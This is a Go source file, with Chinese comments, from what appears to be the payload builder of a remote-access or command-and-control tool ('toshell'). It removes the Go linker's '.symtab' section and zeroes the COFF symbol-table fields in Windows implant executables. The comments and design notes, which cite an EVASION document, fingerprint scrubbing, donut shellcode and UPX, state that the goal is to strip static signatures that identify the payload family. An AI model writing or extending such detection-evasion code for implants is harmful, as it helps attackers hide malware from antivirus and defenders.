package builder

import (
	"encoding/binary"
	"fmt"
	"strings"

	"toshell/internal/server/logging"
)

// ─── PE 节名 / 节熵规范化（v1.4.0 S3 第三批，静态降特征）─────────────────────
//
// 要解决什么（实测底稿见 `.tmp-verify/notes-sections.md`，windows/386 full tcp、
// `-s -w -buildid= -H windowsgui -trimpath`、go1.20.14）：
//
//	PointerToSymbolTable = 3468800（非 0）   —— 正常 strip 过的 Windows PE（MSVC/mingw）应为 0；
//	NumberOfSymbols      = 0                —— 声明"没有符号"却给了非 0 的符号表指针，
//	                                           这个组合本身自相矛盾，是明确的 Go 链接器指纹；
//	最后一节 `.symtab`    vsize=4 rawsize=512 熵=0.02 —— `.symtab` 是 **COFF 时代**的节名，
//	                                           正常 Windows PE 不会有（内容 = 4 字节 COFF 字符串表
//	                                           长度 + 508 字节对齐填充）。
//
// 所以这一步做两件事：**删掉 `.symtab` 节头** + **把两个 COFF 符号表字段置 0**。
// 只说"删掉 Go 留下的东西"，不写入任何"冒充"内容。
//
// 为什么**默认执行**，而 `pe_resource_patch` 是显式开启的（这条区别必须写清）：
//   - `PatchPEResources` 写的是**操作员选定的身份**（公司名/产品名/图标）——那是"这份样本
//     长什么样"的产品决策，默认替操作员做不合适（而且会改体积），所以必须显式配置；
//   - 本步骤只做**减法**：删掉一个标准 Windows PE 不该有的节、清掉两个自相矛盾的字段。
//     它与既有的 `scrub_fingerprint` / `scrub_version_string`（同样默认执行、同样"只擦不写"）
//     同级。不删反而是一个稳定的家族特征。
//
// 判定口径（写进 docs/EVASION.md §2.3）：节熵这一项看的是**"有没有接近 7.8 的节"**，
// 而不是"有没有高熵节"。本仓库交付的 Windows/386 载荷基线为 `.text` 6.08 / `.rdata` 5.68 /
// `.data` 5.60 / `.idata` 4.65 / `.reloc` 6.70 —— 这是正常编译产物的区间（UPX 之后普遍 > 7.8）。
// 所以**不要**为了"降低节熵"去动这些标准节。
//
// 实现口径：
//   - 复用 `patch_resources.go` 的 `parsePEPatchImage`（带写入偏移的 PE 解析）、
//     `pePatchSection`、`VerifyPELayout` —— 不重复实现 PE 解析。
//   - `.symtab` 是**最后一节**（本仓库的 Go 载荷都是）→ 只把 NumberOfSections 减一，
//     再把节表末尾那 40 字节清零；节表其余部分**一个字节都不动**（最安全）。
//   - `.symtab` 是**中间节**（少见）→ 把后续节头整体前移 40 字节（`copy` 自带 memmove
//     语义，能安全处理重叠），同样清零末尾多出来的 40 字节。节表变短，所以
//     `SizeOfHeaders` 天然仍然覆盖节表（不需要也不能改小：它还要覆盖 DOS/PE 头）。
//   - **截断**只在可证明安全时做：该节的原始数据正好在文件末尾
//     （`PointerToRawData + SizeOfRawData == 文件长度`）、没有别的节在自己的原始数据里
//     覆盖这一段、且**没有任何数据目录指向它的 RVA 区间**。此时去掉尾部 rawSize 字节，
//     载荷反而变小（本仓库实测 -512 字节：`v-default.exe` 3469557 → 3469045）。
//     不满足就**保留文件长度、只删节头**（不做"整文件重排"这种高风险操作）；
//     那种情况下 `.symtab` 的原始字节作为"无人引用的填充"留在文件里，熵 0.02，不构成高熵信号。
//   - 找不到 `.symtab`、或两个字段本来就是 0 → **原样返回、不报错**（幂等：对已处理过的
//     PE 再跑一次结果逐字节一致）。mingw 链接的 `format=dll` 产物实测就没有 `.symtab`
//     且两个字段已是 0，这一步在它上面是纯 no-op。
//   - **不改名任何标准节**：`.text`/`.rdata`/`.data`/`.idata`/`.reloc` 是 MSVC/mingw/Go 通用
//     的节名，改名是纯装饰（loader 不读节名），却会把"这份 PE 是哪个链接器产的"这条信息
//     从"常见"推到"独一份"，还可能与加壳/签名工具对不上。`.bss`/`.tls`/`.edata`/`.eh_fram`
//     同理（mingw 的合法节名，实测 `format=dll` 产物就有）——只**报告**、不处理。
//   - 与 `shouldPatchResources` 同一适用范围：只有 Windows 的 `exe`/`bin`/`dll`；
//     shellcode*/raw/so、非 Windows 目标、language=c（mingw 管线）显式跳过。
//     注意：C 植入端本来就没有 Go 的 `.symtab`，跳过是"没有可删的"，不是"漏了"。

// goSymtabSectionName Go 链接器残留的非典型节名（COFF 时代的符号表节）。
const goSymtabSectionName = ".symtab"

// peDirSecurity 数据目录索引 4 = IMAGE_DIRECTORY_ENTRY_SECURITY。
// **它的值不是 RVA，而是文件偏移**（指向文件末尾的证书表），所以判定"截断是否安全"时
// 要单独看它：一旦它非 0，文件尾部就不只是节的原始数据了。
const peDirSecurity = 4

// standardPESectionNames 公认的标准 PE/COFF 节名（MSVC / mingw / Go 通用）。
//
// **只用于报告**（`nonStandardPESectionNames`）：发现名单外的节名时打一行 info 供人工判断，
// 既不改名也不删除。故意**不含** `.symtab` —— 它正是本步骤要删的那个。
var standardPESectionNames = map[string]bool{
	".text": true, ".rdata": true, ".data": true, ".idata": true, ".reloc": true,
	".rsrc": true, ".bss": true, ".tls": true, ".edata": true, ".pdata": true,
	".xdata": true, ".debug": true, ".sdata": true, ".gfids": true, ".00cfg": true,
	".eh_fram": true, ".CRT": true, ".didat": true, ".mrdata": true, ".rodata": true,
}

// PESectionNormalizeResult 一次节规范化的结果（纯数据，供日志与单测断言）。
type PESectionNormalizeResult struct {
	// Changed 是否真的改了字节（false = 幂等 no-op，返回值与输入逐字节一致）。
	Changed bool
	// RemovedSection 被删掉的节名（"" = 没有删节：没找到 or 找到了但不敢删）。
	RemovedSection string
	// FoundSection 找到了但**没删**的节名（配合 KeptSectionReason 使用）。
	FoundSection string
	// SectionIndex / SectionCount 删除前的节下标与节总数（日志用）。
	SectionIndex int
	SectionCount int
	// RemovedRawSize 被删节的 SizeOfRawData。
	RemovedRawSize uint32
	// TruncatedBytes 顺带截断掉的字节数（0 = 未截断，文件长度不变）。
	TruncatedBytes int
	// KeptSectionReason 非空 = 找到了 `.symtab` 但**故意没删**，这里是原因（中文）。
	KeptSectionReason string
	// SymTabPtr / SymCount 处理**前**的原值（日志与"改动前后对照"用）。
	SymTabPtr uint32
	SymCount  uint32
	// OtherNonStandardSections 名单外的其它节名（只报告，不处理）。
	OtherNonStandardSections []string
	// CoveredGapRVA 为了让"删节后不留 RVA 空洞"而额外覆盖的字节数（0 = 无需补，例如
	// mingw DLL 本来就没有 `.symtab`）。见 coverFreedSectionRVA 的事故说明。
	CoveredGapRVA int
	// ExtendedSection 被扩大 VirtualSize 的节名（"" = 没有扩大）。
	ExtendedSection string
	// ExtendedVS 扩大后的 VirtualSize（ExtendedSection 非空时有效）。
	ExtendedVS uint32
}

// NormalizePESections 删掉 Go 链接器残留的 `.symtab` 节并把 COFF 符号表指针/符号数置 0。
//
// 只解析 + 只改上面这两类字段；任何越界/魔数不符沿用 `parsePEPatchImage` 的中文错误。
// 找不到 `.symtab` 时**不报错**（幂等）。写完立刻用 `VerifyPELayout` 回读自检，
// 结构不对就报错——宁可构建失败也不交付坏 PE。
func NormalizePESections(data []byte) ([]byte, PESectionNormalizeResult, error) {
	var res PESectionNormalizeResult
	if len(data) == 0 {
		return nil, res, fmt.Errorf("PE 节规范化：输入为空，没有可处理的 PE 字节")
	}

	m, err := parsePEPatchImage(data)
	if err != nil {
		return nil, res, err
	}
	res.SectionCount = m.numSections
	res.SymTabPtr = binary.LittleEndian.Uint32(data[m.symTabPtrOff : m.symTabPtrOff+4])
	res.SymCount = binary.LittleEndian.Uint32(data[m.symCountOff : m.symCountOff+4])
	res.OtherNonStandardSections = nonStandardPESectionNames(m)

	idx := -1
	for i, s := range m.sections {
		if s.name == goSymtabSectionName {
			idx = i
			break // 正常 PE 不会有第二个同名节；只处理第一个
		}
	}

	// 找到节了，但数据目录还引用着它所在的 RVA 区间 → **不能删**（删了加载器就解析不到
	// 那个目录）。这种情况保留节头、只清零两个符号表字段（那部分永远安全），并留下原因。
	remove := false
	if idx >= 0 {
		sec := m.sections[idx]
		if m.sectionReferencedByDataDir(sec) {
			res.FoundSection = sec.name
			res.KeptSectionReason = fmt.Sprintf(
				"节 %q（RVA 0x%X..0x%X）仍被某个数据目录引用，删掉节头会让加载器解析不到该目录，故只清零 COFF 符号表字段、保留节头",
				sec.name, sec.rva, sec.endRVA())
		} else {
			remove = true
		}
	}

	zeroNeeded := res.SymTabPtr != 0 || res.SymCount != 0
	if !remove && !zeroNeeded {
		// 幂等路径：已经处理过（或本来就没有 Go 残留）→ 一个字节都不动。
		return data, res, nil
	}

	out := append([]byte(nil), data...)

	// ① 两个 COFF 字段一律置 0。注意 PointerToSymbolTable 指向的位置（若真有符号表，
	//    字符串表紧跟其后）在这里已经无人引用：NumberOfSymbols=0 时它本来就是死的。
	binary.LittleEndian.PutUint32(out[m.symTabPtrOff:m.symTabPtrOff+4], 0)
	binary.LittleEndian.PutUint32(out[m.symCountOff:m.symCountOff+4], 0)

	truncateAt := -1
	if remove {
		sec := m.sections[idx]
		res.RemovedSection = sec.name
		res.SectionIndex = idx
		res.RemovedRawSize = sec.rawSize

		// ② 删节头。最后一节只需减计数；中间节把后续节头整体前移 40 字节。
		if idx == m.numSections-1 {
			// 只减计数：节表其余部分一个字节都不动。
		} else {
			// copy 在源/目标重叠时按 memmove 语义处理，前移是安全的。
			copy(
				out[m.secTableOff+idx*peSectionHeaderSize:m.secTableOff+(m.numSections-1)*peSectionHeaderSize],
				out[m.secTableOff+(idx+1)*peSectionHeaderSize:m.secTableOff+m.numSections*peSectionHeaderSize],
			)
		}
		// 无论哪种分支，节表末尾都多出 40 字节：必须清零，否则文件里留着一份"幽灵节头"
		// （名字/大小都在里面），既是静态残留，也容易被误读成"还有第 N 个节"。
		tailOff := m.secTableOff + peSectionHeaderSize*(m.numSections-1)
		for i := tailOff; i < tailOff+peSectionHeaderSize; i++ {
			out[i] = 0
		}
		binary.LittleEndian.PutUint16(out[m.numSectionsOff:m.numSectionsOff+2], uint16(m.numSections-1))

		// ②.5 **补上被删节留下的 RVA 空洞**（v1.4.0 修：这一条是实测出来的硬要求，漏了会让
		// 带资源的载荷整批无法运行）。
		//
		// 事故经过（实测）：删掉 `.symtab` 后在 RVA 空间留下"一页没人映射"的空洞。只删不补时
		// **不带资源**的载荷 Windows 照常加载；可一旦后面再追加 `.rsrc`（PE 资源节，见
		// patch_resources.go），Windows 就会以 `ERROR_BAD_EXE_FORMAT(193)` 拒绝整个镜像 ——
		// 用户的症状正是"用了 neutral 预设的载荷双击提示『此应用无法在你的电脑上运行』"。
		// 逐字节对照实验（`LoadLibraryEx(LOAD_LIBRARY_AS_IMAGE_RESOURCE)`）：
		//   - 带资源 + 有空洞 → REJECT 193；把空洞用一个小节头补上 → OK；
		//   - 只把前一个节的 VirtualSize 扩到覆盖那一页 → OK（386/amd64 皆然）。
		// 所以这里选择"扩前一个节的 VirtualSize"：不动节数、不动文件长度，只是让被删节原本
		// 占用的虚拟区间继续归前一个节所有（多出来的部分由加载器按 0 填充，没有任何代码或
		// 数据引用它）。这样既不留下工具链指纹（`.symtab` 这个名字没了），又不会留下空洞。
		res.CoveredGapRVA, res.ExtendedSection, res.ExtendedVS = coverFreedSectionRVA(m, out, idx)

		// ③ 只有"原始数据正好在文件末尾 + 无人引用"时才顺带截断。
		if canTruncateSectionRaw(m, sec) {
			truncateAt = int(sec.rawPtr)
		}
	}

	if truncateAt >= 0 && truncateAt < len(out) {
		res.TruncatedBytes = len(out) - truncateAt
		out = out[:truncateAt]
	}

	// ④ 写完立刻回读自检：结构不对就报错（宁可构建失败也不交付坏 PE）。
	if err := VerifyPELayout(out); err != nil {
		return nil, res, fmt.Errorf("PE 节规范化后结构自检失败（这属于实现缺陷，已拒绝交付该产物）：%w", err)
	}
	res.Changed = true
	return out, res, nil
}

// coverFreedSectionRVA 把"被删掉的节原本占用的虚拟区间"划给它的前一个节，
// 消除删节在 RVA 空间留下的空洞（返回：被覆盖的字节数、被扩大的节名、扩大后的 VirtualSize）。
//
// 为什么必须做（事故复盘，见 NormalizePESections 里的调用点注释）：
// 空洞本身在"不追加任何东西"时 Windows 是容忍的，因此最初的单测与 plain 载荷验证都通过了；
// 但只要后续再追加一个 PE 节（`.rsrc` 资源节），`LoadLibraryEx` 就会以 193
// （ERROR_BAD_EXE_FORMAT）拒绝镜像 —— 也就是用户看到的"此应用无法在你的电脑上运行"。
// 逐字节对照实验证明两种补法都能修好（补一个小节头 / 扩大前一个节的 VirtualSize），
// 这里选后者：不改节数、不改文件长度，只是让那段虚拟地址继续属于前一个节
// （多出来的尾巴由加载器按 0 填充，没有任何代码或数据引用它）。
//
// 上界怎么取：
//   - 被删节后面还有节（中间节情形）→ 取下一个节的 RVA（再多就会与它重叠）；
//   - 被删节是最后一节（本仓库的 Go 载荷都是）→ 取"被删节虚拟区间的页对齐末尾"，
//     这样之后按 SectionAlignment 追加的新节（如 `.rsrc`）正好接在映射区的下一页，
//     RVA 空间保持页连续。
//
// 返回空节名 = 没有可扩大的前节（被删的是第一节）。那种情况下空洞无法消除，
// 调用方应当意识到"后续若再追加节仍可能被 loader 拒绝"——Go 载荷不会是这种情况。
func coverFreedSectionRVA(m *pePatchImage, out []byte, idx int) (gained int, secName string, newVS uint32) {
	if idx <= 0 || idx >= len(m.sections) {
		return 0, "", 0
	}
	prev := m.sections[idx-1]
	removed := m.sections[idx]

	var upper uint32
	if idx+1 < len(m.sections) {
		upper = m.sections[idx+1].rva
	} else {
		upper = alignUp(removed.rva+removed.vsize, m.sectionAlign)
	}
	if upper <= prev.rva {
		return 0, "", prev.vsize
	}
	desired := upper - prev.rva
	if desired <= prev.vsize {
		return 0, "", prev.vsize // 前节本来就覆盖了（正常不会发生）；不做"缩小"
	}

	// 写回前一个节的 VirtualSize（节头偏移 = 节表起点 + 40*索引 + 8）。
	off := m.secTableOff + peSectionHeaderSize*(idx-1) + 8
	if off+4 > len(out) {
		return 0, "", prev.vsize
	}
	binary.LittleEndian.PutUint32(out[off:off+4], desired)
	m.sections[idx-1].vsize = desired // 让同一趟里的后续判断看到新值
	return int(desired - prev.vsize), prev.name, desired
}

// sectionReferencedByDataDir 是否有任何数据目录落在该节的 RVA 区间里（用
// max(VirtualSize, SizeOfRawData) 作节长度，与 rvaSection 同口径）。
//
// 只覆盖数据目录（PE 头里正式声明的"这里有东西"的清单）：未列进数据目录的内部结构
// （例如被硬编码的地址）无法从 PE 头判定 —— 这也是为什么"中间节"分支只前移节头、
// 绝不做任何数据搬移。
func (m *pePatchImage) sectionReferencedByDataDir(sec pePatchSection) bool {
	start, end := int64(sec.rva), int64(sec.endRVA())
	for i := 0; i < m.dataDirMax; i++ {
		rva, size := m.dataDir(i)
		if rva == 0 && size == 0 {
			continue
		}
		dStart := int64(rva)
		dEnd := dStart + int64(size)
		if size == 0 {
			// Size=0 但 RVA 非 0：按"一个点"处理（同样算引用）。
			dEnd = dStart + 1
		}
		if dStart < end && dEnd > start {
			return true
		}
	}
	return false
}

// canTruncateSectionRaw 判断能否安全地把文件截断到该节原始数据的起点（即丢掉这段 raw 数据）。
//
// 三条都必须成立：
//  1. 原始数据正好在文件末尾（`rawPtr + rawSize == len(data)`）—— 否则后面还有别的东西
//     （例如 exe 路径在 compile() 之后追加的配置块），截断会切掉有效数据；
//  2. 没有任何**别的**节在自己的原始数据里覆盖这一段（畸形 PE 的兜底）；
//  3. 没有安全目录（数据目录 index 4，值是**文件偏移**而非 RVA）—— 有证书表时文件尾部
//     不是节数据。
//
// 调用方已保证"没有数据目录指向该节的 RVA 区间"，所以这里不再重复检查 RVA 引用。
func canTruncateSectionRaw(m *pePatchImage, sec pePatchSection) bool {
	if sec.rawSize == 0 {
		return false
	}
	if int64(sec.rawPtr)+int64(sec.rawSize) != int64(len(m.data)) {
		return false
	}
	if _, sz := m.dataDir(peDirSecurity); sz != 0 {
		return false
	}
	start, end := int64(sec.rawPtr), int64(sec.rawPtr)+int64(sec.rawSize)
	for _, other := range m.sections {
		if other.hdrOff == sec.hdrOff || other.rawSize == 0 {
			continue
		}
		oStart, oEnd := int64(other.rawPtr), int64(other.rawPtr)+int64(other.rawSize)
		if oStart < end && oEnd > start {
			return false
		}
	}
	return true
}

// nonStandardPESectionNames 返回名单外的节名（只报告，供人工判断）。
// `.symtab` 不算在内：它是本步骤**主动删除**的对象，不属于"只报告"这一类。
func nonStandardPESectionNames(m *pePatchImage) []string {
	var out []string
	for _, s := range m.sections {
		if s.name == "" || s.name == goSymtabSectionName || standardPESectionNames[s.name] {
			continue
		}
		out = append(out, s.name)
	}
	return out
}

// ─── 构建流水线接入 ─────────────────────────────────────────────────────────

// isWindowsPEDeliveryFormat 本次构建的交付物是否是"按 PE 交付的 Windows 产物"。
//
// 这是节规范化与资源修补**共用的口径**（`shouldNormalizeSections` / `shouldPatchResources`
// 都调用它），避免两处判断将来漂移。显式跳过的三类都在这里注明原因：
//   - **非 Windows 目标**：Linux/macOS 产物（ELF/Mach-O）根本不是 PE，没有 .symtab/.rsrc 这回事；
//   - **shellcode / shellcode_bin / raw / so**：交付物要么是文本/裸字节，要么不按 PE 交付
//     （shellcode 路径会先编译 PE 再经 donut 转换，PE 结构在那之后就不存在了）；
//   - **language=c（C 植入端，mingw）**：它走独立的 `buildCExecutable` 管线（不是
//     compile/compileLibrary），本步骤没有接到那条链上；而且 mingw 产物本来就没有
//     Go 的 `.symtab` 与那个非 0 的符号表指针 —— 跳过是"没有可删的"，不是"漏了"。
func isWindowsPEDeliveryFormat(opts *BuildOptions, targetOS string) bool {
	if opts == nil {
		return false
	}
	os := strings.ToLower(strings.TrimSpace(targetOS))
	if os == "" {
		os = "windows" // 与 Build/compile 的默认目标一致
	}
	if os != "windows" {
		return false
	}
	switch strings.ToLower(strings.TrimSpace(opts.Format)) {
	case "exe", "bin", "dll":
	default:
		return false
	}
	if strings.EqualFold(strings.TrimSpace(opts.Language), "c") {
		return false
	}
	return true
}

// shouldNormalizeSections 本次构建要不要做 PE 节规范化。
//
// **与资源修补的关键区别：这一步默认执行**（只要交付格式是 Windows PE），因为它只做减法
// （删 Go 残留的节 + 清自相矛盾的字段），不写入任何操作员选定的内容 —— 与既有的
// `scrub_fingerprint` / `scrub_version_string` 同级。理由见本文件顶部注释。
func shouldNormalizeSections(opts *BuildOptions, targetOS string) bool {
	return isWindowsPEDeliveryFormat(opts, targetOS)
}

// normalizeSections 在"指纹擦除之后、资源修补/UPX/签名之前"做节规范化。
//
// 顺序理由（契约见 finalize_order.go 的 StepSectionNormalize）：
//   - 排在资源修补**之前**：先把 Go 的残留节清掉，再追加 `.rsrc`，这样 `.rsrc` 永远是最后一节
//     （追加式资源修补只在 `.rsrc` 装不下时才追加新节，顺序反了会让 `.symtab` 落到 `.rsrc` 之后）；
//   - 排在 UPX 与签名之前：任何改字节的步骤都必须在这两者之前（UPX 之后再改等于把压缩结果
//     改坏；签名之后再改一个字节就是白签）。
//
// 失败即报错（不静默跳过）：走到这里说明交付格式确实是 Windows PE，PE 解析不了属于异常，
// 静默跳过会给出一个"带着 Go 指纹"的产物而没人知道。
func (b *Builder) normalizeSections(bin []byte, opts *BuildOptions, targetOS string) ([]byte, error) {
	if !shouldNormalizeSections(opts, targetOS) {
		return bin, nil
	}
	out, res, err := NormalizePESections(bin)
	if err != nil {
		return nil, fmt.Errorf("PE 节规范化失败：%w", err)
	}
	if res.KeptSectionReason != "" {
		logging.Warn("builder", "PE 节规范化：保留 %q 节 —— %s", res.FoundSection, res.KeptSectionReason)
	}
	if len(res.OtherNonStandardSections) > 0 {
		logging.Info("builder", "PE 节规范化：另有非标准节名（只报告，未做改名/删除）：%s",
			strings.Join(res.OtherNonStandardSections, ", "))
	}
	if !res.Changed {
		return out, nil
	}
	if res.RemovedSection == "" {
		// 没有 `.symtab` 节可删，但两个 COFF 字段被清零了（同样是 Go 指纹）。
		logging.Info("builder", "PE 节规范化：无 %q 节可删；PointerToSymbolTable %d→0、NumberOfSymbols %d→0",
			goSymtabSectionName, res.SymTabPtr, res.SymCount)
		return out, nil
	}
	truncNote := "保留文件长度（只删节头）"
	if res.TruncatedBytes > 0 {
		truncNote = fmt.Sprintf("顺带截断尾部的原始数据 -%d 字节", res.TruncatedBytes)
	}
	logging.Info("builder",
		"PE 节规范化：删除 Go 残留节 %q（第 %d/%d 节，rawsize=%d）；PointerToSymbolTable %d→0、NumberOfSymbols %d→0；%s；文件 %d→%d 字节",
		res.RemovedSection, res.SectionIndex+1, res.SectionCount, res.RemovedRawSize,
		res.SymTabPtr, res.SymCount, truncNote, len(bin), len(out))
	return out, nil
}
